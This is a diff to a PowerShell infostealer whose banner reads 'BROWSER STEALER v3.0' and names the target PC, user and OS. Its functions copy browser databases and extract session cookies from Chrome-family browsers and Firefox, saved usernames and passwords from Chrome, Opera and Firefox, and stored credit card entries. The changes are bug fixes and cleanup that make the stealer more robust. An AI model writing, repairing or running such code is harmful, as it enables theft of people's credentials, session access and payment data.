@@ -23,14 +23,18 @@ function Load-SQLite {
         Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
         Write-Color "[+] Microsoft.Data.Sqlite loaded" "Green"
         return "Microsoft.Data.Sqlite"
-    } catch {}
+    } catch {
+        Write-Color "[!] Microsoft.Data.Sqlite not available" "Yellow"
+    }
     
     # Try System.Data.SQLite (fallback)
     try {
         [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
         Write-Color "[+] System.Data.SQLite loaded" "Green"
         return "System.Data.SQLite"
-    } catch {}
+    } catch {
+        Write-Color "[!] System.Data.SQLite not available" "Yellow"
+    }
     
     # Check if the DLL exists in the temp folder
     $dllPath = "$env:TEMP\System.Data.SQLite.dll"
@@ -39,10 +43,12 @@ function Load-SQLite {
             [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
             Write-Color "[+] SQLite loaded from temp" "Green"
             return "System.Data.SQLite"
-        } catch {}
+        } catch {
+            Write-Color "[!] Failed to load SQLite from temp" "Yellow"
+        }
     }
     
-    Write-Color "[!] SQLite not available" "Red"
+    Write-Color "[!] No SQLite available" "Red"
     return $null
 }
 
@@ -64,7 +70,6 @@ function Read-SQLite {
         Copy-Item $DbPath $tempDb -Force
         
         if ($sqliteType -eq "Microsoft.Data.Sqlite") {
-            # Using Microsoft.Data.Sqlite
             $connString = "Data Source=$tempDb"
             $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection($connString)
             $conn.Open()
@@ -87,7 +92,6 @@ function Read-SQLite {
             $reader.Close()
             $conn.Close()
         } else {
-            # Using System.Data.SQLite
             $connString = "Data Source=$tempDb;Version=3;"
             $conn = New-Object System.Data.SQLite.SQLiteConnection($connString)
             $conn.Open()
@@ -133,8 +137,14 @@ function Get-BrowserCookies {
         $rows = Read-SQLite -DbPath $DbPath -Query "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
         foreach ($row in $rows) {
             if ($row['name'] -and $row['value'] -and $row['name'] -ne "name") {
+                $domain = $row['host_key']
+                if ($domain) {
+                    $domain = $domain -replace '^\.', ''
+                } else {
+                    $domain = "unknown"
+                }
                 $cookies += @{
-                    domain = ($row['host_key'] -or "unknown") -replace '^\.', ''
+                    domain = $domain
                     name = $row['name']
                     value = $row['value']
                     path = "/"
@@ -145,7 +155,9 @@ function Get-BrowserCookies {
                 }
             }
         }
-    } catch {}
+    } catch {
+        # Silently fail
+    }
     return $cookies
 }
 
@@ -163,8 +175,14 @@ function Get-FirefoxCookies {
                     $rows = Read-SQLite -DbPath $cookieFile -Query "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
                     foreach ($row in $rows) {
                         if ($row['name'] -and $row['value']) {
+                            $domain = $row['host']
+                            if ($domain) {
+                                $domain = $domain -replace '^\.', ''
+                            } else {
+                                $domain = "unknown"
+                            }
                             $cookies += @{
-                                domain = ($row['host'] -or "unknown") -replace '^\.', ''
+                                domain = $domain
                                 name = $row['name']
                                 value = $row['value']
                                 path = "/"
@@ -175,7 +193,9 @@ function Get-FirefoxCookies {
                             }
                         }
                     }
-                } catch {}
+                } catch {
+                    # Silently fail
+                }
             }
         }
     }
@@ -196,7 +216,12 @@ function Get-ChromePasswords {
         $rows = Read-SQLite -DbPath $DbPath -Query "SELECT origin_url, username_value, password_value FROM logins"
         foreach ($row in $rows) {
             if ($row['username_value'] -and $row['password_value']) {
-                $url = ($row['origin_url'] -or "unknown") -replace 'https?://', ''
+                $url = $row['origin_url']
+                if ($url) {
+                    $url = $url -replace 'https?://', ''
+                } else {
+                    $url = "unknown"
+                }
                 $passwords += @{
                     url = $url
                     username = $row['username_value']
@@ -205,7 +230,9 @@ function Get-ChromePasswords {
                 }
             }
         }
-    } catch {}
+    } catch {
+        # Silently fail
+    }
     return $passwords
 }
 
@@ -219,7 +246,12 @@ function Get-OperaPasswords {
             $rows = Read-SQLite -DbPath $path -Query "SELECT origin_url, username_value, password_value FROM logins"
             foreach ($row in $rows) {
                 if ($row['username_value'] -and $row['password_value']) {
-                    $url = ($row['origin_url'] -or "unknown") -replace 'https?://', ''
+                    $url = $row['origin_url']
+                    if ($url) {
+                        $url = $url -replace 'https?://', ''
+                    } else {
+                        $url = "unknown"
+                    }
                     $passwords += @{
                         url = $url
                         username = $row['username_value']
@@ -228,7 +260,9 @@ function Get-OperaPasswords {
                     }
                 }
             }
-        } catch {}
+        } catch {
+            # Silently fail
+        }
     }
     return $passwords
 }
@@ -245,15 +279,23 @@ function Get-FirefoxPasswords {
                     $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
                     if ($content.logins) {
                         foreach ($login in $content.logins) {
+                            $url = $login.hostname
+                            if ($url) {
+                                $url = $url -replace 'https?://', ''
+                            } else {
+                                $url = "unknown"
+                            }
                             $passwords += @{
-                                url = ($login.hostname -or "unknown") -replace 'https?://', ''
+                                url = $url
                                 username = $login.username
                                 password = $login.password
                                 browser = "Firefox"
                             }
                         }
                     }
-                } catch {}
+                } catch {
+                    # Silently fail
+                }
             }
         }
     }
@@ -275,15 +317,17 @@ function Get-ChromeCards {
         foreach ($row in $rows) {
             if ($row['name_on_card'] -and $row['card_number_encrypted']) {
                 $cards += @{
-                    name = ($row['name_on_card'] -or "unknown")
-                    number = ($row['card_number_encrypted'] -or "unknown")
-                    month = ($row['expiration_month'] -or "00")
-                    year = ($row['expiration_year'] -or "0000")
+                    name = $row['name_on_card']
+                    number = $row['card_number_encrypted']
+                    month = $row['expiration_month']
+                    year = $row['expiration_year']
                     browser = $BrowserName
                 }
             }
         }
-    } catch {}
+    } catch {
+        # Silently fail
+    }
     return $cards
 }
 
@@ -297,7 +341,7 @@ $os = (Get-WmiObject Win32_OperatingSystem).Caption
 
 Write-Color ""
 Write-Color "============================================" "Cyan"
-Write-Color "  🍪 BROWSER STEALER v3.0" "Green"
+Write-Color "  BROWSER STEALER v3.0" "Green"
 Write-Color "  Target: $pcName" "Yellow"
 Write-Color "  User: $userName" "Yellow"
 Write-Color "  OS: $os" "Yellow"
